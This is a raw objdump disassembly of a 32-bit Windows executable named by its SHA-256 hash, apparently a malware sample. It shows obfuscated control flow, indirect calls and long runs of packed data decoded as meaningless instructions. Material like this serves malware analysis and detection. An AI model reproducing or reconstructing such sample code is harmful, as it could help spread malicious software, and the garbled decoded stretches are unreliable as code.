
bfd4769f6df3736cfd78b643f6e282a9d9026b20262bf1d81a5e4f650debcf30.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	mov    DWORD PTR ds:0x434429,0x7186
  401015:	mov    DWORD PTR [ebp-0x20],eax
  401018:	mov    ecx,DWORD PTR [ebp-0x20]
  40101b:	mov    DWORD PTR ds:0x43439e,0x6cee
  401025:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40102c:	mov    DWORD PTR ds:0x4326f0,0x6120
  401036:	cmp    ecx,eax
  401038:	mov    DWORD PTR ds:0x43441d,0x7018
  401042:	jne    0x4019f7
  401048:	mov    ax,WORD PTR [ebp-0x24]
  40104c:	push   esi
  40104d:	mov    DWORD PTR ds:0x4326fc,0x1b
  401057:	cmp    DWORD PTR ds:0x4326fc,0x0
  40105e:	je     0x40108e
  401064:	cmp    DWORD PTR ds:0x4326fc,0x22
  40106b:	jne    0x40107c
  401071:	push   0x432dc2
  401076:	call   DWORD PTR ds:0x4329b2
  40107c:	mov    ecx,DWORD PTR ds:0x4326fc
  401082:	dec    ecx
  401083:	mov    DWORD PTR ds:0x4326fc,ecx
  401089:	jmp    0x401057
  40108e:	mov    ecx,0x8a3e
  401093:	mov    DWORD PTR ds:0x43438a,0x48c
  40109d:	xor    ax,cx
  4010a0:	add    DWORD PTR ds:0x434419,0x61ba
  4010aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4010ad:	xor    esi,DWORD PTR ds:0x434396
  4010b3:	push   edi
  4010b4:	mov    DWORD PTR ds:0x43437a,0x1c
  4010be:	cmp    DWORD PTR ds:0x43437a,0x0
  4010c5:	je     0x401105
  4010cb:	cmp    DWORD PTR ds:0x43437a,0x25
  4010d2:	jne    0x4010f3
  4010d8:	push   0x38d9
  4010dd:	push   DWORD PTR [ebp-0xc]
  4010e0:	push   0x7b63
  4010e5:	push   0x618f
  4010ea:	push   DWORD PTR [ebp-0x28]
  4010ed:	call   DWORD PTR ds:0x4329b6
  4010f3:	mov    edi,DWORD PTR ds:0x43437a
  4010f9:	dec    edi
  4010fa:	mov    DWORD PTR ds:0x43437a,edi
  401100:	jmp    0x4010be
  401105:	mov    edi,0x3b04
  40110a:	xor    DWORD PTR ds:0x432700,edx
  401110:	add    ax,di
  401113:	add    DWORD PTR ds:0x43439a,0xf3f
  40111d:	movzx  eax,ax
  401120:	add    DWORD PTR ds:0x4326f4,edi
  401126:	not    eax
  401128:	or     esi,DWORD PTR ds:0x434411
  40112e:	and    eax,DWORD PTR [ecx]
  401130:	movzx  ecx,WORD PTR ds:0x432dc2
  401137:	xor    DWORD PTR ds:0x432de6,ecx
  40113d:	mov    ecx,DWORD PTR [ebp+0x8]
  401140:	sub    DWORD PTR ds:0x434425,ecx
  401146:	mov    DWORD PTR [ecx],eax
  401148:	adc    ecx,0x6b0b
  40114e:	mov    ecx,0x7510855
  401153:	sbb    esi,DWORD PTR ds:0x432dda
  401159:	mov    esi,0x32729c
  40115e:	sbb    DWORD PTR ds:0x434425,0x3918
  401168:	push   ebx
  401169:	or     DWORD PTR ds:0x4343a2,ebx
  40116f:	mov    ax,WORD PTR [ebp-0x24]
  401173:	dec    ebx
  401174:	movzx  eax,ax
  401177:	mov    DWORD PTR [ebp-0x38],eax
  40117a:	sub    eax,0x1c8b
  40117f:	mov    eax,DWORD PTR [ebp+0x8]
  401182:	mov    DWORD PTR [ebp-0x28],eax
  401185:	xor    eax,eax
  401187:	or     eax,DWORD PTR ds:0x432dce
  40118d:	add    DWORD PTR ds:0x434376,eax
  401193:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  40119a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4011a1:	mov    eax,0x9577
  4011a6:	or     DWORD PTR ds:0x43439a,0x2325
  4011b0:	mov    WORD PTR [ebp-0x4],ax
  4011b4:	movzx  ebx,BYTE PTR ds:0x4326f4
  4011bb:	or     DWORD PTR ds:0x4326f0,ebx
  4011c1:	lea    eax,[ebp-0x30]
  4011c4:	mov    DWORD PTR [ebp-0x34],eax
  4011c7:	mov    eax,DWORD PTR [ebp-0x28]
  4011ca:	mov    DWORD PTR [ebp-0x2c],eax
  4011cd:	add    DWORD PTR ds:0x434419,0x693e
  4011d7:	lea    eax,[ebp-0x18]
  4011da:	and    DWORD PTR ds:0x43436a,0x0
  4011e4:	jmp    0x4011f6
  4011e9:	mov    ebx,DWORD PTR ds:0x43436a
  4011ef:	inc    ebx
  4011f0:	mov    DWORD PTR ds:0x43436a,ebx
  4011f6:	cmp    DWORD PTR ds:0x43436a,0x18
  4011fd:	jae    0x40123a
  401203:	cmp    DWORD PTR ds:0x43436a,0x8
  40120a:	jne    0x40121b
  401210:	push   0x7a50
  401215:	call   DWORD PTR ds:0x4329ba
  40121b:	cmp    DWORD PTR ds:0x43436a,0x7
  401222:	jne    0x401235
  401228:	mov    ebx,DWORD PTR ds:0x43436a
  40122e:	inc    ebx
  40122f:	mov    DWORD PTR ds:0x43436a,ebx
  401235:	jmp    0x4011e9
  40123a:	mov    DWORD PTR [ebp-0x1c],eax
  40123d:	mov    eax,DWORD PTR [ebp-0x1c]
  401240:	mov    DWORD PTR [eax],0xf89f2da9
  401246:	mov    eax,DWORD PTR [ebp-0x14]
  401249:	mov    ebx,DWORD PTR [ebp-0x8]
  40124c:	and    DWORD PTR ds:0x434415,0x66ce
  401256:	xor    eax,ecx
  401258:	xor    ebx,ecx
  40125a:	and    DWORD PTR ds:0x434419,0x3a0f
  401264:	xor    edx,edx
  401266:	and    DWORD PTR ds:0x432de6,0x4326f0
  401270:	add    eax,esi
  401272:	mov    DWORD PTR ds:0x43441d,0x1b71
  40127c:	add    ebx,esi
  40127e:	div    ebx
  401280:	mov    DWORD PTR ds:0x434376,0x5747
  40128a:	mov    edx,DWORD PTR [ebp-0x2c]
  40128d:	mov    DWORD PTR ds:0x4326f4,0x57da
  401297:	cmp    eax,DWORD PTR [edx]
  401299:	mov    DWORD PTR ds:0x434382,0x6b31
  4012a3:	je     0x4019ca
  4012a9:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4012b0:	lea    eax,[ebp-0xc]
  4012b3:	sbb    edx,DWORD PTR ds:0x432dca
  4012b9:	mov    DWORD PTR [ebp-0x10],eax
  4012bc:	mov    eax,DWORD PTR [ebp-0x10]
  4012bf:	jmp    0x401447
  4012c4:	popa   
  4012c5:	xchg   BYTE PTR ds:0x6151e949,cl
  4012cb:	mov    dh,0x3f
  4012cd:	mov    ah,0xd5
  4012cf:	mov    dl,0xa1
  4012d1:	lods   al,BYTE PTR ds:[esi]
  4012d2:	inc    ebx
  4012d3:	fs jo  0x401346
  4012d6:	jo     0x401348
  4012d8:	in     eax,0x7f
  4012da:	jo     0x40134c
  4012dc:	rcl    bh,0x3d
  4012df:	aad    0x39
  4012e1:	ror    edi,cl
  4012e3:	rol    eax,1
  4012e5:	pop    es
  4012e6:	push   es
  4012e7:	add    ecx,DWORD PTR [edi]
  4012e9:	inc    ebx
  4012ea:	add    cl,BYTE PTR [edi]
  4012ec:	xor    ecx,DWORD PTR [edi]
  4012ee:	ret    0xc71a
  4012f1:	adc    bl,BYTE PTR [edi]
  4012f3:	mov    ecx,0xddb7025a
  4012f8:	add    bh,ch
  4012fa:	mov    ebp,0x8003c8db
  4012ff:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401305:	lods   eax,DWORD PTR ds:[esi]
  401306:	sar    BYTE PTR [eax+0x6fee581f],1
  40130c:	or     edx,DWORD PTR [ecx]
  40130e:	sahf   
  40130f:	jp     0x4012d9
  401311:	inc    edx
  401312:	lods   al,BYTE PTR ds:[esi]
  401313:	push   ebx
  401314:	sub    eax,0xad3ec6d1
  401319:	mov    WORD PTR [ebx-0x3b],?
  40131c:	stos   DWORD PTR es:[edi],eax
  40131d:	js     0x4012e5
  40131f:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401325:	jmp    0x401359
  401327:	mov    ebp,ecx
  401329:	dec    edi
  40132a:	fcomp  DWORD PTR [eax-0x656800bf]
  401330:	pop    es
  401331:	test   eax,0xed4dbddc
  401336:	sub    BYTE PTR [ebp+0x23],dl
  401339:	mov    ah,0xec
  40133b:	pusha  
  40133c:	nop
  40133d:	mov    esi,0x94c3117b
  401342:	and    esi,edx
  401344:	jmp    0x401396
  401346:	(bad)  
  401347:	out    0xba,al
  401349:	repnz in al,dx
  40134b:	xchg   esp,eax
  40134c:	xor    edi,ecx
  40134e:	jbe    0x4013b5
  401350:	xlat   BYTE PTR ds:[ebx]
  401351:	and    cl,ch
  401353:	add    al,0xd9
  401355:	adc    DWORD PTR [ecx-0x68],edx
  401358:	xor    eax,0x7a616f03
  40135d:	or     dh,BYTE PTR [ecx]
  40135f:	fld    QWORD PTR [eax+0x7f752a56]
  401365:	xor    BYTE PTR [edi+0xba8db0c],cl
  40136b:	pop    ebx
  40136c:	push   ebp
  40136d:	(bad)  
  40136f:	or     ebx,edx
  401371:	pop    esi
  401372:	fstp   DWORD PTR [ecx]
  401374:	jno    0x401306
  401376:	mov    eax,0x2b15374b
  40137b:	ja     0x4013a6
  40137d:	sbb    al,0xd3
  40137f:	xor    BYTE PTR [edi-0x16],cl
  401382:	int    0xa6
  401384:	add    ch,bh
  401386:	cmp    bh,0x80
  401389:	add    eax,0x3497f2b0
  40138e:	mov    dl,0xe6
  401390:	cmp    ebx,esp
  401392:	aaa    
  401393:	out    dx,al
  401394:	leave  
  401395:	bound  edx,QWORD PTR ds:[edi-0x361577c]
  40139c:	std    
  40139d:	mov    es,WORD PTR [edi]
  40139f:	adc    al,0xee
  4013a1:	push   cs
  4013a2:	cld    
  4013a3:	inc    edi
  4013a4:	push   es
  4013a5:	push   0x819af3e4
  4013aa:	aaa    
  4013ab:	jae    0x4013cb
  4013ad:	pop    ebx
  4013ae:	or     al,0x1f
  4013b0:	sub    eax,0x99a089eb
  4013b5:	mov    ch,0x61
  4013b7:	add    DWORD PTR [eax-0x70732530],0x57814efd
  4013c1:	stos   DWORD PTR es:[edi],eax
  4013c2:	cmp    ch,bl
  4013c4:	mov    WORD PTR [ebx-0x2c1bc9fe],es
  4013ca:	in     eax,dx
  4013cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013cc:	pop    ebp
  4013cd:	or     eax,0xea249f08
  4013d2:	jmp    0xda7e:0x156f20d4
  4013d9:	add    BYTE PTR [eax-0x24],ch
  4013dc:	adc    bh,BYTE PTR [esi+0xf]
  4013df:	sbb    DWORD PTR [ebp+0x29],0xd6cca2e
  4013e6:	xor    al,BYTE PTR [eax]
  4013e8:	mov    WORD PTR [esi+0x62],?
  4013eb:	jbe    0x4013e3
  4013ed:	xchg   ecx,eax
  4013ee:	mov    eax,ds:0xe4a8eb6
  4013f3:	xchg   esp,eax
  4013f4:	push   edx
  4013f5:	aaa    
  4013f6:	xor    BYTE PTR [ecx],dh
  4013f8:	out    0xeb,al
  4013fa:	stos   BYTE PTR es:[edi],al
  4013fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013fc:	pop    esp
  4013fd:	paddw  mm7,mm4
  401400:	push   esp
  401401:	add    al,bl
  401403:	mov    bl,0xac
  401405:	cmp    edi,DWORD PTR [ebp-0x48d3e3f3]
  40140b:	retf   
  40140c:	fldenv [edx+ebx*4]
  40140f:	sbb    ch,BYTE PTR [ecx]
  401411:	fsub   QWORD PTR [si-0x63]
  401415:	out    dx,al
  401416:	inc    ecx
  401417:	add    eax,0x586de605
  40141c:	mov    edx,?
  40141e:	and    al,BYTE PTR [eax]
  401420:	xor    eax,0xaf7c6fd4
  401425:	ins    DWORD PTR es:[edi],dx
  401426:	(bad)  
  401427:	popf   
  401428:	jnp    0x401451
  40142a:	rcl    DWORD PTR [ebx+0x55],0x46
  40142e:	fst    st(2)
  401430:	hlt    
  401431:	das    
  401432:	retf   0xd467
  401435:	es mov dh,0x9a
  401438:	jp     0x4013d3
  40143a:	lods   al,BYTE PTR ds:[esi]
  40143b:	dec    esi
  40143c:	gs mov edx,0x61f865b9
  401442:	mov    dl,0x8d
  401444:	and    BYTE PTR [eax],cl
  401446:	sbb    BYTE PTR [ebx-0x132d96f0],cl
  40144c:	test   eax,0x1089f89e
  401451:	mov    eax,DWORD PTR [ebp-0xc]
  401454:	cmp    eax,0x742b26d4
  401459:	jmp    0x4015e1
  40145e:	push   ds
  40145f:	fcmovnb st,st(2)
  401461:	mov    edx,0x5ba661c1
  401466:	xlat   BYTE PTR ds:[ebx]
  401467:	les    ecx,FWORD PTR [esi]
  401469:	test   esi,edx
  40146b:	dec    edx
  40146c:	push   ecx
  40146d:	cs in  eax,0x7f
  401470:	jo     0x4014e2
  401472:	in     eax,0x7f
  401474:	jo     0x4014e6
  401476:	out    dx,al
  401477:	pop    ebx
  401478:	int    0xf5
  40147a:	xchg   BYTE PTR [edi+ebx*2-0x22],ah
  40147e:	bswap  esi
  401480:	xrelease mov BYTE PTR [ebx],dh
  401483:	inc    edx
  401484:	(bad)  
  401485:	rcr    edi,1
  401487:	jne    0x401436
  401489:	and    al,0xc2
  40148b:	xchg   DWORD PTR [ebx],eax
  40148d:	mov    eax,ds:0x17f33060
  401492:	jae    0x40142a
  401494:	ret    
  401495:	stc    
  401496:	jae    0x40149b
  401498:	adc    DWORD PTR [edx+edx*1+0x37],edi
  40149c:	(bad)  [ebx-0x625186d8]
  4014a2:	ins    DWORD PTR es:[edi],dx
  4014a3:	loop   0x40147d
  4014a5:	lock fwait
  4014a7:	mov    al,ds:0x3c8bd8e7
  4014ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014ad:	mov    dl,0x9
  4014af:	outs   dx,DWORD PTR ds:[esi]
  4014b0:	push   cs
  4014b1:	push   esp
  4014b2:	and    al,0x35
  4014b4:	sbb    al,0x78
  4014b6:	loop   0x40147e
  4014b8:	loope  0x401533
  4014ba:	xchg   ebp,eax
  4014bb:	or     al,0x67
  4014bd:	inc    ebp
  4014be:	sbb    ah,BYTE PTR [edx-0x68314551]
  4014c4:	imul   edi,DWORD PTR [esi+0x3f452dc7],0x43d38a2d
  4014ce:	add    DWORD PTR ds:0x88b0c95,ecx
  4014d4:	and    eax,0x552fbf6b
  4014d9:	fwait
  4014da:	xchg   edx,eax
  4014db:	leave  
  4014dc:	jmp    DWORD PTR [edx]
  4014de:	shl    DWORD PTR [esi-0x6b],cl
  4014e1:	cdq    
  4014e2:	cmp    ah,BYTE PTR [ebp-0x64080f16]
  4014e8:	sub    al,0x6
  4014ea:	cs jae 0x4014a7
  4014ed:	into   
  4014ee:	loopne 0x4014a5
  4014f0:	mov    esp,0xcbbf5f17
  4014f5:	scas   al,BYTE PTR es:[edi]
  4014f6:	inc    edi
  4014f7:	inc    esi
  4014f8:	cmp    edx,DWORD PTR [edi]
  4014fa:	add    DWORD PTR [eax-0x54],esi
  4014fd:	jge    0x401552
  4014ff:	sub    ecx,DWORD PTR [ebx]
  401501:	ret    0x3d8
  401504:	lahf   
  401505:	retf   
  401506:	imul   esi,eax,0x78
  401509:	out    0x86,al
  40150b:	mov    esi,0x4a7677ea
  401510:	sti    
  401511:	sbb    eax,0x74d6fc84
  401516:	xor    DWORD PTR [esi-0x79d3e8a4],esp
  40151c:	xchg   edx,eax
  40151d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40151e:	sbb    al,0x89
  401520:	and    al,BYTE PTR fs:[edi+0x75]
  401524:	fmul   QWORD PTR [ebp+edx*2+0x51]
  401528:	mov    edi,0x10ddce17
  40152d:	add    edx,esp
  40152f:	mov    cl,0x1c
  401531:	loopne 0x401506
  401533:	xchg   edx,eax
  401534:	rcl    DWORD PTR [eax],cl
  401536:	es cs mov edi,0x47805469
  40153d:	pop    ds
  40153e:	mov    ah,0x18
  401540:	xchg   edx,eax
  401541:	fwait
  401542:	aad    0x8e
  401544:	pop    ebp
  401545:	das    
  401546:	xor    DWORD PTR [edi+ebx*4],0xb
  40154a:	dec    eax
  40154b:	icebp  
  40154c:	mov    ah,0x49
  40154e:	mov    cl,BYTE PTR [eax-0xb]
  401551:	add    al,0xc6
  401553:	add    al,0x8b
  401555:	fcomp  DWORD PTR [eax-0x4e446bce]
  40155b:	jb     0x4014f4
  40155d:	rcr    DWORD PTR [ecx],cl
  40155f:	or     BYTE PTR [eax+0x12c74ed9],0xd1
  401566:	fsub   st,st(5)
  401568:	xchg   esp,eax
  401569:	out    dx,al
  40156a:	int    0xdf
  40156c:	ss test ch,dl
  40156f:	and    DWORD PTR [eax+0x3f2d3028],ebp
  401575:	in     eax,0xe6
  401577:	in     al,dx
  401578:	jno    0x401554
  40157a:	jmp    0x4015b7
  40157c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40157d:	mov    al,ds:0x4bdc7e46
  401582:	icebp  
  401583:	mov    ds:0x5288d739,eax
  401588:	xchg   edi,eax
  401589:	sbb    eax,0x8812e053
  40158e:	aam    0xac
  401590:	repz and al,0x56
  401593:	sub    edi,DWORD PTR [esi-0x1f]
  401596:	or     eax,0x26b1743d
  40159b:	enter  0xdbc9,0xa6
  40159f:	popf   
  4015a0:	mov    cs,WORD PTR [eax+0x66]
  4015a3:	adc    dh,BYTE PTR [ebx+0x26]
  4015a6:	es jecxz 0x4015f2
  4015a9:	mov    esp,0xb9cea1e8
  4015ae:	jo     0x4015de
  4015b0:	outs   dx,BYTE PTR ds:[esi]
  4015b1:	or     cl,BYTE PTR [eax-0x3edfcb41]
  4015b7:	or     BYTE PTR [ebx],0xa
  4015ba:	shl    DWORD PTR [ecx-0x47],cl
  4015bd:	rcr    BYTE PTR [ecx+0x366a53bd],0x5c
  4015c4:	inc    edi
  4015c5:	mov    ch,0x54
  4015c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015c8:	inc    edi
  4015c9:	cld    
  4015ca:	test   al,0xae
  4015cc:	jno    0x4015fc
  4015ce:	fisubr WORD PTR [edx-0x6b22064f]
  4015d4:	dec    BYTE PTR [ecx+ebx*4+0x14]
  4015d8:	pop    esp
  4015d9:	in     eax,dx
  4015da:	jnp    0x4015f3
  4015dc:	sub    DWORD PTR [ecx+ebx*8],edi
  4015df:	mov    ch,0x94
  4015e1:	je     0x4015f5
  4015e7:	mov    eax,DWORD PTR [ebp-0x1c]
  4015ea:	or     DWORD PTR [eax],0x60751c9c
  4015f0:	jmp    0x4019d9
  4015f5:	mov    eax,DWORD PTR [ebp-0xc]
  4015f8:	add    eax,DWORD PTR [ebp-0x18]
  4015fb:	cmp    eax,0x6cca547d
  401600:	je     0x401614
  401606:	mov    eax,DWORD PTR [ebp-0x10]
  401609:	and    DWORD PTR [eax],0x751c99
  40160f:	jmp    0x4019d9
  401614:	mov    eax,DWORD PTR [ebp-0xc]
  401617:	mov    edx,DWORD PTR [ebp-0x18]
  40161a:	or     eax,edx
  40161c:	cmp    eax,0xfcbf2ffd
  401621:	je     0x401635
  401627:	mov    eax,DWORD PTR [ebp-0x10]
  40162a:	xor    DWORD PTR [eax],0x2650fa8f
  401630:	jmp    0x4019d9
  401635:	mov    ax,WORD PTR [ebp-0x4]
  401639:	mov    edx,0x8a3e
  40163e:	xor    ax,dx
  401641:	mov    edx,DWORD PTR [ebp-0x28]
  401644:	mov    edx,DWORD PTR [edx]
  401646:	add    ax,di
  401649:	cmp    ax,WORD PTR [edx]
  40164c:	je     0x401821
  401652:	mov    eax,DWORD PTR [ebp-0x14]
  401655:	xor    eax,ecx
  401657:	add    eax,esi
  401659:	mov    DWORD PTR [ebp-0x30],eax
  40165c:	mov    eax,DWORD PTR [ebp-0x34]
  40165f:	mov    dx,WORD PTR [ebp-0x38]
  401663:	mov    ebx,0x8a3e
  401668:	xor    dx,bx
  40166b:	mov    ebx,DWORD PTR [ebp-0x8]
  40166e:	add    dx,di
  401671:	jmp    0x4017f9
  401676:	clc    
  401677:	repnz sbb eax,0xa851698d
  40167d:	icebp  
  40167e:	pusha  
  40167f:	xchg   ebx,eax
  401680:	rcl    DWORD PTR [ebx+0xa],1
  401683:	jne    0x40169b
  401685:	aaa    
  401686:	dec    edx
  401687:	jle    0x4016f9
  401689:	jo     0x401670
  40168b:	jg     0x4016fd
  40168d:	jo     0x4016ea
  40168f:	ds jmp 0x6c43:0xc8d2112c
  401697:	pop    edx
  401698:	enter  0x96e0,0x76
  40169c:	push   eax
  40169d:	stc    
  40169e:	xor    eax,0x27a82cd1
  4016a3:	pop    ss
  4016a4:	pop    ebp
  4016a5:	pusha  
  4016a6:	cwde   
  4016a7:	pop    ebx
  4016a8:	push   eax
  4016a9:	addr16 inc esi
  4016ab:	pop    ds
  4016ac:	ins    DWORD PTR es:[edi],dx
  4016ad:	and    al,0xef
  4016af:	aas    
  4016b0:	out    0x8b,eax
  4016b2:	lahf   
  4016b3:	cmp    WORD PTR [eax+0xc],si
  4016b7:	push   esi
  4016b8:	ins    DWORD PTR es:[edi],dx
  4016b9:	(bad)  
  4016bb:	jp     0x4016c2
  4016bd:	pop    edi
  4016be:	ds daa 
  4016c0:	mov    al,ds:0xe8cba7d5
  4016c5:	mov    ebx,0x16990d1e
  4016ca:	sbb    DWORD PTR [eax],ebx
  4016cc:	adc    al,ch
  4016ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016cf:	gs inc esi
  4016d1:	push   esi
  4016d2:	jecxz  0x401717
  4016d4:	pop    esi
  4016d5:	and    BYTE PTR [edx],ah
  4016d7:	imul   ebp,DWORD PTR [ebp+0x14c0b5cb],0x764543e3
  4016e1:	clc    
  4016e2:	enter  0xe682,0xfc
  4016e6:	and    bl,BYTE PTR [edi+0x21]
  4016e9:	repz sbb BYTE PTR [eax+eiz*4+0x4c26d540],bh
  4016f1:	(bad)  
  4016f2:	stos   BYTE PTR es:[edi],al
  4016f3:	call   0xfe78:0xfb9266b5
  4016fa:	pop    ss
  4016fb:	aad    0x83
  4016fd:	repnz cmp ecx,DWORD PTR [ecx-0x13]
  401701:	adc    ebp,ebp
  401703:	call   0x3d6c:0xc268d1ac
  40170a:	xor    ebx,ebp
  40170c:	push   edx
  40170e:	mov    esp,0xf26edcf3
  401713:	aas    
  401714:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401715:	sbb    edx,DWORD PTR [esi+0x4d5afd68]
  40171b:	cli    
  40171c:	and    eax,0xdb26c11
  401721:	not    bl
  401723:	adc    eax,0x107d58e2
  401728:	pushf  
  401729:	or     al,0x85
  40172b:	sbb    eax,0x9e0c9850
  401730:	repnz aam 0xc3
  401733:	xor    al,0x5e
  401735:	cld    
  401736:	call   0x873a8648
  40173b:	mov    edi,0xa0f5bb4d
  401740:	pop    edx
  401741:	repz cwde 
  401743:	sbb    al,0x5f
  401745:	adc    ch,BYTE PTR [edx]
  401747:	push   ebp
  401748:	out    0xb7,eax
  40174a:	(bad)  
  40174b:	stos   DWORD PTR es:[edi],eax
  40174c:	and    dl,BYTE PTR [esi+0x59]
  40174f:	ffree  st(6)
  401751:	xchg   DWORD PTR [esi-0x4d],ebp
  401754:	aaa    
  401755:	xor    ecx,DWORD PTR [ecx+esi*2-0x1e]
  401759:	(bad)  
  40175a:	inc    ecx
  40175b:	xchg   edi,eax
  40175c:	iret   
  40175d:	aad    0x7
  40175f:	in     eax,0x77
  401761:	pusha  
  401762:	je     0x4016fc
  401764:	aam    0x2c
  401766:	lea    esi,[edi+0x1f]
  401769:	adc    ch,bl
  40176b:	xchg   ebx,eax
  40176c:	mov    esp,0xb996f1ad
  401771:	inc    edx
  401772:	clc    
  401773:	inc    ebp
  401774:	sbb    eax,0xf3aa2f00
  401779:	inc    ecx
  40177a:	pop    esi
  40177b:	fild   DWORD PTR [ecx-0x5c]
  40177e:	pop    esi
  40177f:	lahf   
  401780:	rol    ax,0x5f
  401784:	aas    
  401785:	(bad)  
  401786:	and    al,0xb5
  401788:	sub    DWORD PTR [ebp+ebp*2-0x77],0xaf830c43
  401790:	mov    ebp,esi
  401792:	jno    0x40173f
  401794:	pop    ds
  401795:	xchg   edx,eax
  401796:	mov    ds:0x7cbfd57b,al
  40179b:	inc    ebp
  40179c:	inc    ebx
  40179d:	cli    
  40179e:	xor    DWORD PTR [edi+0x11],ecx
  4017a1:	dec    esi
  4017a2:	aam    0xd6
  4017a4:	jl     0x401737
  4017a6:	add    DWORD PTR [edi+0x1de880b5],eax
  4017ac:	test   BYTE PTR [ebx-0x596637a6],dh
  4017b2:	mov    ebx,DWORD PTR [ebp+0x25]
  4017b5:	std    
  4017b6:	adc    dh,0xc0
  4017b9:	adc    bl,dh
  4017bb:	pop    esp
  4017bc:	ret    
  4017bd:	mov    eax,ds:0x6596373a
  4017c2:	dec    edx
  4017c3:	pushf  
  4017c4:	daa    
  4017c5:	jae    0x401759
  4017c7:	nop
  4017c8:	jno    0x401805
  4017ca:	mov    ds:0xf60e10ae,eax
  4017cf:	(bad)  
  4017d0:	xor    eax,0xf083b673
  4017d5:	dec    ecx
  4017d6:	mov    ds:0x74b91cf8,eax
  4017db:	and    ah,BYTE PTR [edx]
  4017dd:	in     al,0x21
  4017df:	ficom  DWORD PTR [edx+0x552f128d]
  4017e5:	stos   BYTE PTR es:[edi],al
  4017e6:	mov    edi,0x77e26dfc
  4017eb:	and    eax,0x737450b4
  4017f0:	add    ah,ah
  4017f2:	clc    
  4017f3:	rcr    DWORD PTR [eax+0x45],0x32
  4017f7:	xor    esp,DWORD PTR [edi]
  4017f9:	movzx  edx,dx
  4017fc:	xor    ebx,ecx
  4017fe:	lea    edx,[edx+ebx*1+0x32729c]
  401805:	add    DWORD PTR [eax],edx
  401807:	mov    eax,DWORD PTR [ebp-0x2c]
  40180a:	mov    edx,DWORD PTR [ebp-0x8]
  40180d:	mov    ebx,DWORD PTR [ebp-0x30]
  401810:	xor    edx,ecx
  401812:	add    edx,esi
  401814:	imul   edx,ebx
  401817:	sub    DWORD PTR [eax],edx
  401819:	mov    eax,DWORD PTR [ebp-0x14]
  40181c:	jmp    0x4019dc
  401821:	mov    eax,DWORD PTR [ebp-0xc]
  401824:	mov    edx,DWORD PTR [ebp-0x18]
  401827:	jmp    0x4019af
  40182c:	pop    ebx
  40182d:	arpl   di,di
  40182f:	out    dx,eax
  401830:	xchg   ebx,esi
  401832:	imul   esi,DWORD PTR [ebx-0x5d],0x7d
  401836:	jae    0x401839
  401838:	xchg   BYTE PTR [ebp+0x7c3fe98b],cl
  40183e:	jo     0x4018b0
  401840:	in     eax,0x7f
  401842:	jo     0x4018b4
  401844:	mov    esi,0xba01ea3d
  401849:	ins    BYTE PTR es:[edi],dx
  40184a:	or     al,0x7c
  40184c:	fdivr  DWORD PTR [ebx-0x4e]
  40184f:	in     eax,dx
  401850:	repz mov cl,0xfb
  401853:	sub    eax,0xc44be524
  401858:	ret    
  401859:	test   al,0x26
  40185b:	sbb    eax,0xfc15f023
  401860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401861:	xor    esi,ebx
  401863:	pop    ebp
  401864:	daa    
  401865:	jmp    0x35dbeda1
  40186a:	js     0x4018e4
  40186c:	pop    ss
  40186d:	in     al,dx
  40186e:	fnstenv [ecx+0x29]
  401871:	mov    bl,0xb7
  401873:	out    dx,eax
  401874:	(bad)  
  401875:	fnsave [ebp+edi*8+0x64445b5d]
  40187c:	or     BYTE PTR [edx+0x7],dh
  40187f:	imul   esp,DWORD PTR [edx],0xf
  401882:	int3   
  401883:	stos   DWORD PTR es:[edi],eax
  401884:	xchg   ebx,eax
  401885:	xor    cl,BYTE PTR [eax+0x3d]
  401888:	pop    ds
  401889:	xchg   ebx,eax
  40188a:	push   edi
  40188b:	mov    esi,eax
  40188d:	lods   al,BYTE PTR ds:[esi]
  40188e:	jge    0x401868
  401890:	(bad)  
  401891:	pushf  
  401892:	jae    0x401842
  401894:	push   esi
  401895:	pop    esp
  401896:	mov    dl,0x1b
  401898:	outs   dx,DWORD PTR ds:[esi]
  401899:	sub    al,0xed
  40189b:	sub    BYTE PTR [ecx-0x38d355ac],0xa9
  4018a2:	sub    al,bl
  4018a4:	mov    esi,DWORD PTR [ebp+eiz*4-0x4bdafb9d]
  4018ab:	test   DWORD PTR [edx+0x311883b4],ebp
  4018b1:	jbe    0x401893
  4018b3:	push   esi
  4018b4:	je     0x40187b
  4018b6:	inc    esi
  4018b7:	ja     0x401871
  4018b9:	mov    ebx,0x4c189e98
  4018be:	lods   al,BYTE PTR ds:[esi]
  4018bf:	ds fdivr st(0),st
  4018c2:	scas   al,BYTE PTR es:[edi]
  4018c3:	jle    0x4018e4
  4018c5:	push   ebp
  4018c6:	scas   eax,DWORD PTR es:[edi]
  4018c7:	mov    dh,0x5b
  4018c9:	dec    esi
  4018ca:	mov    ebp,0x30acacfe
  4018cf:	mov    esp,0x93085c6f
  4018d4:	jecxz  0x401929
  4018d6:	or     ah,al
  4018d8:	jge    0x40190a
  4018da:	or     BYTE PTR [ecx],bh
  4018dc:	cs adc eax,0xa720048e
  4018e2:	mov    ds:0xf5fdef69,eax
  4018e7:	dec    BYTE PTR [esi+0x465e876a]
  4018ed:	hlt    
  4018ee:	adc    al,0xdf
  4018f0:	fild   DWORD PTR [ebp-0xa3428f0]
  4018f6:	mov    ah,cl
  4018f8:	lds    ecx,FWORD PTR [edi-0x7e]
  4018fb:	popf   
  4018fc:	mov    edx,0x792865e3
  401901:	test   DWORD PTR [ebx],eax
  401903:	or     ch,dh
  401905:	mov    ebx,0x1f4a6378
  40190a:	xor    esi,DWORD PTR [ebp-0x10]
  40190d:	mov    eax,0xa87ca3c7
  401912:	and    eax,0x328b39e1
